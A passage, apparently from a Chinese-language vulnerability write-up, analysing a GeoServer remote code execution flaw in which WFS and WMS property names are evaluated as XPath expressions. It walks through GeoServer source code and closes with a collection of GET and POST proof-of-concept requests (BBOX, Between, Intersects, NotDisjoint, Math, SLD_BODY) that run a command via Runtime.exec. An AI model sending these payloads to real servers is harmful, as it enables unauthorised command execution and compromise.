operator">/</span>geoserver<span class="token operator">/</span>wfs<span class="token operator">?</span>service<span class="token operator">=</span><span class="token constant">WFS</span><span class="token operator">&amp;</span>version<span class="token operator">=</span><span class="token number">2.0</span><span class="token number">.0</span><span class="token operator">&amp;</span>request<span class="token operator">=</span><span class="token class-name">GetPropertyValue</span><span class="token operator">&amp;</span>typeNames<span class="token operator">=</span>sf<span class="token operator">:</span>archsites<span class="token operator">&amp;</span>valueReference<span class="token operator">=</span><span class="token function">exec</span><span class="token punctuation">(</span><span class="token class-name"><span class="token namespace">java<span class="token punctuation">.</span>lang<span class="token punctuation">.</span></span>Runtime</span><span class="token punctuation">.</span><span class="token function">getRuntime</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token char">'calc'</span><span class="token punctuation">)</span></code></pre><p>然后定位到GetPropertyValue#run方法<br><img src="/img/24-7-8/14.png"><br>跟进property方法<br><img src="/img/24-7-8/15.png"><br>返回的是AttributeExpressionImpl对象<br><img src="/img/24-7-8/16.png"><br>这里可以看到，传入的name，赋值给attpath属性,可知request.getValueReference(),即ValueReference标签对应着xpath表达式<br>那么，就是这样控制xpath表达式的，接着看怎么执行的<br>跟进AttributeExpressionImpl#evaluate方法<br>也是将上面赋值的attPath传入了<br><img src="/img/24-7-8/17.png"></p><p>也是来到了漏洞api ：FeaturePropertyAccessorFactory#get<br><img src="/img/24-7-8/18.png"><br>这里iteratePointers方法就能触发了漏洞了，可以参考之前的文章</p><h3 id="GetFeature"><a href="#GetFeature" class="headerlink" title="GetFeature"></a>GetFeature</h3><p>这个请求是用于从服务器检索地理空间要素的全部或部分属性及几何信息，而通过前面的漏洞的分析我们很容易知道漏洞触发点是在属性名查询这里，所以这里的GetFeature请求我们重点关注一下filter过滤逻辑部分，对于属性名的处理</p><pre class="language-java" data-language="java"><code class="language-java"><span class="token comment">// 定义一个名为validateFilter的方法，该方法接收四个参数：一个Filter对象，一个Query对象，一个FeatureTypeInfo对象和一个GetFeatureRequest对象。</span><span class="token keyword">void</span> <span class="token function">validateFilter</span><span class="token punctuation">(</span>        <span class="token class-name">Filter</span> filter<span class="token punctuation">,</span> <span class="token class-name">Query</span> query<span class="token punctuation">,</span> <span class="token keyword">final</span> <span class="token class-name">FeatureTypeInfo</span> meta<span class="token punctuation">,</span> <span class="token keyword">final</span> <span class="token class-name">GetFeatureRequest</span> request<span class="token punctuation">)</span>        <span class="token keyword">throws</span> <span class="token class-name">IOException</span> <span class="token punctuation">{</span>    <span class="token comment">// 1. 确保任何属性名都指向一个实际存在的属性</span>    <span class="token comment">// 获取特征类型</span>    <span class="token keyword">final</span> <span class="token class-name">FeatureType</span> featureType <span class="token operator">=</span> meta<span class="token punctuation">.</span><span class="token function">getFeatureType</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token comment">// 创建一个表达式访问器</span>    <span class="token class-name">ExpressionVisitor</span> visitor <span class="token operator">=</span>            <span class="token keyword">new</span> <span class="token class-name">AbstractExpressionVisitor</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>                <span class="token comment">// 重写visit方法</span>                <span class="token annotation punctuation">@Override</span>                <span class="token keyword">public</span> <span class="token class-name">Object</span> <span class="token function">visit</span><span class="token punctuation">(</span><span class="token class-name">PropertyName</span> name<span class="token punctuation">,</span> <span class="token class-name">Object</span> data<span class="token punctuation">)</span> <span class="token punctuation">{</span>                    <span class="token comment">// 如果属性名在特征类型中找不到，并且属性名不是GmlBoundedBy</span>                    <span class="token keyword">if</span> <span class="token punctuation">(</span>name<span class="token punctuation">.</span><span class="token function">evaluate</span><span class="token punctuation">(</span>featureType<span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token keyword">null</span> <span class="token operator">&amp;&amp;</span> <span class="token operator">!</span><span class="token function">isGmlBoundedBy</span><span class="token punctuation">(</span>name<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>                        <span class="token comment">// 抛出一个WFSException异常，异常信息为"非法的属性名"</span>                        <span class="token keyword">throw</span> <span class="token keyword">new</span> <span class="token class-name">WFSException</span><span class="token punctuation">(</span>                                request<span class="token punctuation">,</span>                                <span class="token string">"Illegal property name: "</span>                                        <span class="token operator">+</span> name<span class="token punctuation">.</span><span class="token function">getPropertyName</span><span class="token punctuation">(</span><span class="token punctuation">)</span>                                        <span class="token operator">+</span> <span class="token string">" for feature type "</span>                                        <span class="token operator">+</span> meta<span class="token punctuation">.</span><span class="token function">prefixedName</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span>                                <span class="token string">"InvalidParameterValue"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                    <span class="token punctuation">}</span>                    <span class="token keyword">return</span> name<span class="token punctuation">;</span>                <span class="token punctuation">}</span>            <span class="token punctuation">}</span><span class="token punctuation">;</span>    <span class="token comment">// 使用访问器访问过滤器</span>    filter<span class="token punctuation">.</span><span class="token function">accept</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">AbstractFilterVisitor</span><span class="token punctuation">(</span>visitor<span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token keyword">null</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token comment">// 2. 确保任何空间谓词都是针对实际的空间属性</span>    <span class="token comment">// 创建一个过滤器访问器</span>    <span class="token class-name">AbstractFilterVisitor</span> fvisitor <span class="token operator">=</span>            <span class="token keyword">new</span> <span class="token class-name">AbstractFilterVisitor</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>                <span class="token comment">// 重写visit方法</span>                <span class="token annotation punctuation">@Override</span>                <span class="token keyword">protected</span> <span class="token class-name">Object</span> <span class="token function">visit</span><span class="token punctuation">(</span><span class="token class-name">BinarySpatialOperator</span> filter<span class="token punctuation">,</span> <span class="token class-name">Object</span> data<span class="token punctuation">)</span> <span class="token punctuation">{</span>                    <span class="token class-name">PropertyName</span> name <span class="token operator">=</span> <span class="token keyword">null</span><span class="token punctuation">;</span>                    <span class="token comment">// 如果过滤器的第一个表达式是属性名</span>                    <span class="token keyword">if</span> <span class="token punctuation">(</span>filter<span class="token punctuation">.</span><span class="token function">getExpression1</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token keyword">instanceof</span> <span class="token class-name">PropertyName</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>                        name <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token class-name">PropertyName</span><span class="token punctuation">)</span> filter<span class="token punctuation">.</span><span class="token function">getExpression1</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                    <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token keyword">if</span> <span class="token punctuation">(</span>filter<span class="token punctuation">.</span><span class="token function">getExpression2</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token keyword">instanceof</span> <span class="token class-name">PropertyName</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>                        <span class="token comment">// 如果过滤器的第二个表达式是属性名</span>                        name <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token class-name">PropertyName</span><span class="token punctuation">)</span> filter<span class="token punctuation">.</span><span class="token function">getExpression2</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                    <span class="token punctuation">}</span>                    <span class="token keyword">if</span> <span class="token punctuation">(</span>name <span class="token operator">!=</span> <span class="token keyword">null</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>                        <span class="token comment">// 检查特征类型以确保其是一个几何类型</span>                        <span class="token class-name">AttributeDescriptor</span> att <span class="token operator">=</span>                                <span class="token punctuation">(</span><span class="token class-name">AttributeDescriptor</span><span class="token punctuation">)</span> name<span class="token punctuation">.</span><span class="token function">evaluate</span><span class="token punctuation">(</span>featureType<span class="token punctuation">)</span><span class="token punctuation">;</span>                        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token punctuation">(</span>att <span class="token keyword">instanceof</span> <span class="token class-name">GeometryDescriptor</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token operator">!</span><span class="token function">isGmlBoundedBy</span><span class="token punctuation">(</span>name<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>                            <span class="token comment">// 如果不是，抛出一个WFSException异常，异常信息为"属性不是特征类型的几何属性"</span>                            <span class="token keyword">throw</span> <span class="token keyword">new</span> <span class="token class-name">WFSException</span><span class="token punctuation">(</span>                                    request<span class="token punctuation">,</span>                                    <span class="token string">"Property "</span>                                            <span class="token operator">+</span> name                                            <span class="token operator">+</span> <span class="token string">" is not geometric in feature type "</span>                                            <span class="token operator">+</span> meta<span class="token punctuation">.</span><span class="token function">prefixedName</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span>                                    <span class="token string">"InvalidParameterValue"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                        <span class="token punctuation">}</span>                    <span class="token punctuation">}</span>                    <span class="token keyword">return</span> filter<span class="token punctuation">;</span>                <span class="token punctuation">}</span>            <span class="token punctuation">}</span><span class="token punctuation">;</span>    <span class="token comment">// 使用访问器访问过滤器</span>    filter<span class="token punctuation">.</span><span class="token function">accept</span><span class="token punctuation">(</span>fvisitor<span class="token punctuation">,</span> <span class="token keyword">null</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token comment">// 3. 确保查询中指定的任何边界都相对于查询上定义的srs是有效的</span>    <span class="token comment">// 如果wfs是CiteCompliant</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span>wfs<span class="token punctuation">.</span><span class="token function">isCiteCompliant</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token comment">// 如果查询的srsName不为空</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span>query<span class="token punctuation">.</span><span class="token function">getSrsName</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">!=</span> <span class="token keyword">null</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>            <span class="token keyword">final</span> <span class="token class-name">Query</span> fquery <span class="token operator">=</span> query<span class="token punctuation">;</span>            <span class="token comment">// 创建一个CiteBBOXValidator对象</span>            fvisitor <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">CiteBBOXValidator</span><span class="token punctuation">(</span>fquery<span class="token punctuation">,</span> request<span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token comment">// 使用访问器访问过滤器</span>            filter<span class="token punctuation">.</span><span class="token function">accept</span><span class="token punctuation">(</span>fvisitor<span class="token punctuation">,</span> <span class="token keyword">null</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span>    <span class="token comment">// 4. 确保在非空间比较中不使用空间属性 (CITE WFS 2.0)</span>    <span class="token comment">// 如果wfs是CiteCompliant</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span>wfs<span class="token punctuation">.</span><span class="token function">isCiteCompliant</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token comment">// 创建一个过滤器访问器</span>        fvisitor <span class="token operator">=</span>                <span class="token keyword">new</span> <span class="token class-name">AbstractFilterVisitor</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>                    <span class="token comment">// 重写visit方法</span>                    <span class="token annotation punctuation">@Override</span>                    <span class="token keyword">protected</span> <span class="token class-name">Object</span> <span class="token function">visit</span><span class="token punctuation">(</span><span class="token class-name">BinaryComparisonOperator</span> filter<span class="token punctuation">,</span> <span class="token class-name">Object</span> data<span class="token punctuation">)</span> <span class="token punctuation">{</span>                        <span class="token class-name">Expression</span> ex1 <span class="token operator">=</span> filter<span class="token punctuation">.</span><span class="token function">getExpression1</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                        <span class="token class-name">Expression</span> ex2 <span class="token operator">=</span> filter<span class="token punctuation">.</span><span class="token function">getExpression2</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                        <span class="token comment">// 如果第一个表达式是属性名</span>                        <span class="token keyword">if</span> <span class="token punctuation">(</span>ex1 <span class="token keyword">instanceof</span> <span class="token class-name">PropertyName</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>                            <span class="token function">checkNonSpatial</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token class-name">PropertyName</span><span class="token punctuation">)</span> ex1<span class="token punctuation">)</span><span class="token punctuation">;</span>                        <span class="token punctuation">}</span>                        <span class="token comment">// 如果第二个表达式是属性名</span>                        <span class="token keyword">if</span> <span class="token punctuation">(</span>ex2 <span class="token keyword">instanceof</span> <span class="token class-name">PropertyName</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>                            <span class="token function">checkNonSpatial</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token class-name">PropertyName</span><span class="token punctuation">)</span> ex2<span class="token punctuation">)</span><span class="token punctuation">;</span>                        <span class="token punctuation">}</span>                        <span class="token keyword">return</span> <span class="token keyword">super</span><span class="token punctuation">.</span><span class="token function">visit</span><span class="token punctuation">(</span>filter<span class="token punctuation">,</span> data<span class="token punctuation">)</span><span class="token punctuation">;</span>                    <span class="token punctuation">}</span>                    <span class="token comment">// 定义一个检查非空间的方法</span>                    <span class="token keyword">private</span> <span class="token keyword">void</span> <span class="token function">checkNonSpatial</span><span class="token punctuation">(</span><span class="token class-name">PropertyName</span> pn<span class="token punctuation">)</span> <span class="token punctuation">{</span>                        <span class="token class-name">AttributeDescriptor</span> ad <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token class-name">AttributeDescriptor</span><span class="token punctuation">)</span> pn<span class="token punctuation">.</span><span class="token function">evaluate</span><span class="token punctuation">(</span>featureType<span class="token punctuation">)</span><span class="token punctuation">;</span>                        <span class="token comment">// 如果属性描述符是一个几何描述符或者是GmlBoundedBy</span>                        <span class="token keyword">if</span> <span class="token punctuation">(</span>ad <span class="token keyword">instanceof</span> <span class="token class-name">GeometryDescriptor</span> <span class="token operator">||</span> <span class="token function">isGmlBoundedBy</span><span class="token punctuation">(</span>pn<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>                            <span class="token comment">// 抛出一个WFSException异常，异常信息为"不能在字母数字二进制比较中使用空间属性"</span>                            <span class="token keyword">throw</span> <span class="token keyword">new</span> <span class="token class-name">WFSException</span><span class="token punctuation">(</span>                                    request<span class="token punctuation">,</span>                                    <span class="token string">"Cannot use a spatial property in a alphanumeric binary "</span>                                            <span class="token operator">+</span> <span class="token string">"comparison"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                        <span class="token punctuation">}</span>                    <span class="token punctuation">}</span>                <span class="token punctuation">}</span><span class="token punctuation">;</span>        <span class="token comment">// 使用访问器访问过滤器</span>        filter<span class="token punctuation">.</span><span class="token function">accept</span><span class="token punctuation">(</span>fvisitor<span class="token punctuation">,</span> <span class="token keyword">null</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span></code></pre><pre class="language-java" data-language="java"><code class="language-java"><span class="token operator">/</span>geoserver<span class="token operator">/</span>wms<span class="token operator">?</span>version<span class="token operator">=</span><span class="token number">1.3</span><span class="token number">.0</span><span class="token operator">&amp;</span>bbox<span class="token operator">=</span><span class="token number">24</span><span class="token punctuation">,</span><span class="token operator">-</span><span class="token number">130</span><span class="token punctuation">,</span><span class="token number">50</span><span class="token punctuation">,</span><span class="token operator">-</span><span class="token number">66</span><span class="token operator">&amp;</span><span class="token class-name">Format</span><span class="token operator">=</span>image<span class="token operator">/</span>png<span class="token operator">&amp;</span>request<span class="token operator">=</span><span class="token class-name">GetMap</span><span class="token operator">&amp;</span>width<span class="token operator">=</span><span class="token number">550</span><span class="token operator">&amp;</span>height<span class="token operator">=</span><span class="token number">250</span><span class="token operator">&amp;</span>crs<span class="token operator">=</span><span class="token constant">EPSG</span><span class="token operator">:</span><span class="token number">4326</span><span class="token operator">&amp;</span><span class="token constant">SLD_BODY</span><span class="token operator">=</span><span class="token operator">%</span><span class="token number">3</span>CStyledLayerDescriptor<span class="token operator">+</span>version<span class="token operator">%</span><span class="token number">3D</span><span class="token operator">%</span><span class="token number">221.1</span><span class="token number">.0</span><span class="token operator">%</span><span class="token number">22</span><span class="token operator">%</span><span class="token number">3</span>E<span class="token operator">%</span><span class="token number">3</span>CUserLayer<span class="token operator">%</span><span class="token number">3</span>E<span class="token operator">%</span><span class="token number">3</span>CName<span class="token operator">%</span><span class="token number">3</span>Etopp<span class="token operator">%</span><span class="token number">3</span>Astates<span class="token operator">%</span><span class="token number">3</span>C<span class="token operator">%</span><span class="token number">2F</span>Name<span class="token operator">%</span><span class="token number">3</span>E<span class="token operator">%</span><span class="token number">3</span>CUserStyle<span class="token operator">%</span><span class="token number">3</span>E<span class="token operator">%</span><span class="token number">3</span>CName<span class="token operator">%</span><span class="token number">3</span>EUserSelection<span class="token operator">%</span><span class="token number">3</span>C<span class="token operator">%</span><span class="token number">2F</span>Name<span class="token operator">%</span><span class="token number">3</span>E<span class="token operator">%</span><span class="token number">3</span>CFeatureTypeStyle<span class="token operator">%</span><span class="token number">3</span>E<span class="token operator">%</span><span class="token number">3</span>CRule<span class="token operator">%</span><span class="token number">3</span>E<span class="token operator">%</span><span class="token number">3</span>CFilter<span class="token operator">%</span><span class="token number">3</span>E<span class="token operator">%</span><span class="token number">3</span>CPropertyIsEqualTo<span class="token operator">%</span><span class="token number">3</span>E<span class="token operator">%</span><span class="token number">3</span>CPropertyName<span class="token operator">%</span><span class="token number">3</span>Eexec<span class="token operator">%</span><span class="token number">28</span>java<span class="token punctuation">.</span>lang<span class="token punctuation">.</span>Runtime<span class="token punctuation">.</span>getRuntime<span class="token operator">%</span><span class="token number">28</span><span class="token operator">%</span><span class="token number">29</span><span class="token operator">%</span><span class="token number">2</span>C<span class="token operator">%</span><span class="token number">22</span>calc<span class="token operator">%</span><span class="token number">22</span><span class="token operator">%</span><span class="token number">29</span><span class="token operator">%</span><span class="token number">3</span>C<span class="token operator">%</span><span class="token number">2F</span>PropertyName<span class="token operator">%</span><span class="token number">3</span>E<span class="token operator">%</span><span class="token number">3</span>CLiteral<span class="token operator">%</span><span class="token number">3</span>EIllinois<span class="token operator">%</span><span class="token number">3</span>C<span class="token operator">%</span><span class="token number">2F</span>Literal<span class="token operator">%</span><span class="token number">3</span>E<span class="token operator">%</span><span class="token number">3</span>C<span class="token operator">%</span><span class="token number">2F</span>PropertyIsEqualTo<span class="token operator">%</span><span class="token number">3</span>E<span class="token operator">%</span><span class="token number">3</span>C<span class="token operator">%</span><span class="token number">2F</span>Filter<span class="token operator">%</span><span class="token number">3</span>E<span class="token operator">%</span><span class="token number">3</span>CPolygonSymbolizer<span class="token operator">%</span><span class="token number">3</span>E<span class="token operator">%</span><span class="token number">3</span>CFill<span class="token operator">%</span><span class="token number">3</span>E<span class="token operator">%</span><span class="token number">3</span>CSvgParameter<span class="token operator">+</span>name<span class="token operator">%</span><span class="token number">3D</span><span class="token operator">%</span><span class="token number">22f</span>ill<span class="token operator">%</span><span class="token number">22</span><span class="token operator">%</span><span class="token number">3</span>E<span class="token operator">%</span><span class="token number">23F</span><span class="token constant">F0000</span><span class="token operator">%</span><span class="token number">3</span>C<span class="token operator">%</span><span class="token number">2F</span>SvgParameter<span class="token operator">%</span><span class="token number">3</span>E<span class="token operator">%</span><span class="token number">3</span>C<span class="token operator">%</span><span class="token number">2F</span>Fill<span class="token operator">%</span><span class="token number">3</span>E<span class="token operator">%</span><span class="token number">3</span>C<span class="token operator">%</span><span class="token number">2F</span>PolygonSymbolizer<span class="token operator">%</span><span class="token number">3</span>E<span class="token operator">%</span><span class="token number">3</span>C<span class="token operator">%</span><span class="token number">2F</span>Rule<span class="token operator">%</span><span class="token number">3</span>E<span class="token operator">%</span><span class="token number">3</span>CRule<span class="token operator">%</span><span class="token number">3</span>E<span class="token operator">%</span><span class="token number">3</span>CLineSymbolizer<span class="token operator">%</span><span class="token number">3</span>E<span class="token operator">%</span><span class="token number">3</span>CStroke<span class="token operator">%</span><span class="token number">2F</span><span class="token operator">%</span><span class="token number">3</span>E<span class="token operator">%</span><span class="token number">3</span>C<span class="token operator">%</span><span class="token number">2F</span>LineSymbolizer<span class="token operator">%</span><span class="token number">3</span>E<span class="token operator">%</span><span class="token number">3</span>C<span class="token operator">%</span><span class="token number">2F</span>Rule<span class="token operator">%</span><span class="token number">3</span>E<span class="token operator">%</span><span class="token number">3</span>C<span class="token operator">%</span><span class="token number">2F</span>FeatureTypeStyle<span class="token operator">%</span><span class="token number">3</span>E<span class="token operator">%</span><span class="token number">3</span>C<span class="token operator">%</span><span class="token number">2F</span>UserStyle<span class="token operator">%</span><span class="token number">3</span>E<span class="token operator">%</span><span class="token number">3</span>C<span class="token operator">%</span><span class="token number">2F</span>UserLayer<span class="token operator">%</span><span class="token number">3</span>E<span class="token operator">%</span><span class="token number">3</span>C<span class="token operator">%</span><span class="token number">2F</span>StyledLayerDescriptor<span class="token operator">%</span><span class="token number">3</span>E </code></pre><img src="/img/24-7-8/19.png">跟上面的一样是从evalute走入的## 其他Poc### BBOX-1.0<pre class="language-none"><code class="language-none">post:&lt;wfs:GetFeature service="WFS" version="1.0.0"  xmlns:topp="http://www.openplans.org/topp"  xmlns:wfs="http://www.opengis.net/wfs"  xmlns:ogc="http://www.opengis.net/ogc"  xmlns:gml="http://www.opengis.net/gml"  xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"  xsi:schemaLocation="http://www.opengis.net/wfs"&gt;  &lt;wfs:Query typeName="topp:states"&gt;    &lt;ogc:Filter&gt;      &lt;ogc:BBOX&gt;        &lt;ogc:PropertyName&gt;exec(java.lang.Runtime.getRuntime(),"calc")&lt;/ogc:PropertyName&gt;        &lt;gml:Box srsName="http://www.opengis.net/gml/srs/epsg.xml#4326"&gt;           &lt;gml:coordinates&gt;-75.102613,40.212597 -72.361859,41.512517&lt;/gml:coordinates&gt;        &lt;/gml:Box&gt;      &lt;/ogc:BBOX&gt;   &lt;/ogc:Filter&gt;  &lt;/wfs:Query&gt;&lt;/wfs:GetFeature&gt;</code></pre>### BBOX-1.1<pre class="language-none"><code class="language-none">post:&lt;wfs:GetFeature service="WFS" version="1.1.0"  xmlns:topp="http://www.openplans.org/topp"  xmlns:wfs="http://www.opengis.net/wfs"  xmlns:ogc="http://www.opengis.net/ogc"  xmlns:gml="http://www.opengis.net/gml"  xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"  xsi:schemaLocation="http://www.opengis.net/wfs"&gt;  &lt;wfs:Query typeName="topp:states"&gt;    &lt;ogc:Filter&gt;      &lt;ogc:BBOX&gt;        &lt;ogc:PropertyName&gt;exec(java.lang.Runtime.getRuntime(),"calc")&lt;/ogc:PropertyName&gt;        &lt;gml:Envelope srsName="http://www.opengis.net/gml/srs/epsg.xml#4326"&gt;           &lt;gml:lowerCorner&gt;-75.102613 40.212597&lt;/gml:lowerCorner&gt;           &lt;gml:upperCorner&gt;-72.361859 41.512517&lt;/gml:upperCorner&gt;        &lt;/gml:Envelope&gt;      &lt;/ogc:BBOX&gt;   &lt;/ogc:Filter&gt;  &lt;/wfs:Query&gt;&lt;/wfs:GetFeature&gt;</code></pre>### Between-1.0/1.1<pre class="language-none"><code class="language-none">&lt;wfs:GetFeature service="WFS" version="1.0.0"  xmlns:topp="http://www.openplans.org/topp"  xmlns:wfs="http://www.opengis.net/wfs"  xmlns:ogc="http://www.opengis.net/ogc"  xmlns:gml="http://www.opengis.net/gml"  xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"  xsi:schemaLocation="http://www.opengis.net/wfs"&gt;  &lt;wfs:Query typeName="topp:states"&gt;&lt;ogc:Filter&gt;&lt;ogc:PropertyIsBetween&gt;&lt;ogc:PropertyName&gt;exec(java.lang.Runtime.getRuntime(),"calc")&lt;/ogc:PropertyName&gt;&lt;ogc:LowerBoundary&gt;&lt;ogc:Literal&gt;100000&lt;/ogc:Literal&gt;&lt;/ogc:LowerBoundary&gt;&lt;ogc:UpperBoundary&gt;&lt;ogc:Literal&gt;150000&lt;/ogc:Literal&gt;&lt;/ogc:UpperBoundary&gt;&lt;/ogc:PropertyIsBetween&gt;&lt;/ogc:Filter&gt;  &lt;/wfs:Query&gt;&lt;/wfs:GetFeature&gt; GET:/geoserver/wfs?request=GetFeature&amp;version=1.1.0&amp;typeName=topp:states&amp;propertyName=STATE_NAME,LAND_KM,the_geom&amp;outputFormat=GML2&amp;FILTER=%3CFilter+xmlns%3D%22http%3A%2F%2Fwww.opengis.net%2Fogc%22%3E%3CPropertyIsBetween%3E%3CPropertyName%3Eexec%28java.lang.Runtime.getRuntime%28%29%2C%22calc%22%29%3C%2FPropertyName%3E%3CLowerBoundary%3E%3CLiteral%3E100000%3C%2FLiteral%3E%3C%2FLowerBoundary%3E%3CUpperBoundary%3E%3CLiteral%3E150000%3C%2FLiteral%3E%3C%2FUpperBoundary%3E%3C%2FPropertyIsBetween%3E%3C%2FFilter%3E</code></pre>### Intersects-1.0/1.1<pre class="language-none"><code class="language-none">POST:&lt;wfs:GetFeature service="WFS" version="1.0.0"  xmlns:topp="http://www.openplans.org/topp"  xmlns:wfs="http://www.opengis.net/wfs"  xmlns="http://www.opengis.net/ogc"  xmlns:gml="http://www.opengis.net/gml"  xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"  xsi:schemaLocation="http://www.opengis.net/wfs"&gt;  &lt;wfs:Query typeName="topp:states"&gt;    &lt;Filter&gt;      &lt;Intersects&gt;        &lt;PropertyName&gt;exec(java.lang.Runtime.getRuntime(),"calc")&lt;/PropertyName&gt;        &lt;/Intersects&gt;      &lt;/Filter&gt;  &lt;/wfs:Query&gt;&lt;/wfs:GetFeature&gt;GET:/geoserver/wfs?request=GetFeature&amp;version=1.0.0&amp;typeName=topp:states&amp;FILTER=%3CFilter+xmlns%3D%22http%3A%2F%2Fwww.opengis.net%2Fogc%22+xmlns%3Agml%3D%22http%3A%2F%2Fwww.opengis.net%2Fgml%22%3E%3CIntersects%3E%3CPropertyName%3Eexec%28java.lang.Runtime.getRuntime%28%29%2C%22calc%22%29%3C%2FPropertyName%3E%3Cgml%3APoint+srsName%3D%22EPSG%3A4326%22%3E%3Cgml%3Acoordinates%3E-74.817265%2C40.5296504%3C%2Fgml%3Acoordinates%3E%3C%2Fgml%3APoint%3E%3C%2FIntersects%3E%3C%2FFilter%3E</code></pre>### NotDisjoint<pre class="language-none"><code class="language-none">POST:&lt;wfs:GetFeature service="WFS" version="2.0.0"    xmlns:wfs="http://www.opengis.net/wfs/2.0" xmlns:fes="http://www.opengis.net/fes/2.0"    xmlns:gml="http://www.opengis.net/gml/3.2" xmlns:sf="http://www.openplans.org/spearfish"    xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"    xsi:schemaLocation="http://www.opengis.net/wfs/2.0 http://schemas.opengis.net/wfs/2.0/wfs.xsd        http://www.opengis.net/gml/3.2 http://schemas.opengis.net/gml/3.2.1/gml.xsd"&gt;    &lt;wfs:Query typeNames="sf:bugsites"&gt;        &lt;fes:Filter&gt;            &lt;fes:Not&gt;                &lt;fes:Disjoint&gt;                    &lt;fes:ValueReference&gt;exec(java.lang.Runtime.getRuntime(),"calc")&lt;/fes:ValueReference&gt;                &lt;/fes:Disjoint&gt;            &lt;/fes:Not&gt;        &lt;/fes:Filter&gt;    &lt;/wfs:Query&gt;&lt;/wfs:GetFeature&gt;GET:/geoserver/wfs?service=WFS&amp;version=2.0.0&amp;request=GetFeature&amp;typenames=sf:bugsites&amp;filter=%3Cfes%3AFilter+xmlns%3Afes%3D%22http%3A%2F%2Fwww.opengis.net%2Ffes%2F2.0%22+xmlns%3Agml%3D%22http%3A%2F%2Fwww.opengis.net%2Fgml%2F3.2%22%3E%3Cfes%3ANot%3E%3Cfes%3ADisjoint%3E%3Cfes%3AValueReference%3Eexec%28java.lang.Runtime.getRuntime%28%29%2C%22calc%22%29%3C%2Ffes%3AValueReference%3E%3Cgml%3APolygon+gml%3Aid%3D%27polygon.1%27+srsName%3D%27http%3A%2F%2Fwww.opengis.net%2Fdef%2Fcrs%2FEPSG%2F0%2F26713%27%3E%3Cgml%3Aexterior%3E%3Cgml%3ALinearRing%3E%3Cgml%3AposList%3E590431+4915204+590430+4915205+590429+4915204+590430+4915203+590431+4915204%3C%2Fgml%3AposList%3E%3C%2Fgml%3ALinearRing%3E%3C%2Fgml%3Aexterior%3E%3C%2Fgml%3APolygon%3E%3C%2Ffes%3ADisjoint%3E%3C%2Ffes%3ANot%3E%3C%2Ffes%3AFilter%3E</code></pre>### Math<pre class="language-none"><code class="language-none">POST：&lt;wfs:GetFeature service="WFS" version="1.0.0"  xmlns:topp="http://www.openplans.org/topp"  xmlns:wfs="http://www.opengis.net/wfs"  xmlns:ogc="http://www.opengis.net/ogc"  xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"  xsi:schemaLocation="http://www.opengis.net/wfs"&gt;  &lt;wfs:Query typeName="topp:states"&gt;    &lt;ogc:Filter&gt;      &lt;ogc:PropertyIsGreaterThan&gt;        &lt;ogc:Div&gt;            &lt;ogc:PropertyName&gt;exec(java.lang.Runtime.getRuntime(),"calc")&lt;/ogc:PropertyName&gt;            &lt;ogc:PropertyName&gt;xxx&lt;/ogc:PropertyName&gt;        &lt;/ogc:Div&gt;         &lt;ogc:Literal&gt;0.25&lt;/ogc:Literal&gt;    &lt;/ogc:PropertyIsGreaterThan&gt;    &lt;/ogc:Filter&gt;    